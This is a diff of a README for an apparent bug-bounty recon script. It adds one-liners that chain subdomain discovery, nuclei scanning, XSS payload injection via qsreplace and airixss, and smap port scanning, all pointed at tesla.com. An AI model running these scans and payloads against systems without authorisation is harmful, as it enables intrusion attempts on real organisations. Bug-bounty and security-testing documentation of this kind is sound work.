@@ -44,7 +44,11 @@ TARGET=tesla.com; python3 recon-bluster.py -d $TARGET; nuclei -silent -l $TARGET
 ```
 ## AIRIXSS
 ```shell
-TARGET=tesla.com; cat $TARGET/target_xss.txt | qsreplace '"><img src=x onerror=prompt(1)>' | airixss -payload '<img src=x onerror=prompt(1)>' | grep "31mVulnerable" | anew target_xss_airixss.txt
+TARGET=tesla.com; python3 recon-bluster.py -d $TARGET; cat $TARGET/target_xss.txt | qsreplace '"><img src=x onerror=prompt(1)>' | airixss -payload '<img src=x onerror=prompt(1)>' | grep "31mVulnerable" | anew target_xss_airixss.txt
+```
+## SMAP
+```shell
+TARGET=tesla.com; python3 recon-bluster.py -d $TARGET; smap -iL $TARGET/subdomains.txt -oG $TARGET/subdomains_smap.txt
 ```
 # Credit
 * [assetfinder](https://github.com/tomnomnom/assetfinder)
@@ -58,5 +62,6 @@ TARGET=tesla.com; cat $TARGET/target_xss.txt | qsreplace '"><img src=x onerror=p
 * [hakrawler](https://github.com/hakluke/hakrawler)
 * [unew](https://github.com/dwisiswant0/unew)
 * [qsreplace](https://github.com/tomnomnom/qsreplace)
+* [smap](https://github.com/s0md3v/Smap)
 # Special Thanks
 * [KingOfBugBountyTips](https://github.com/KingOfBugbounty/KingOfBugBountyTips)
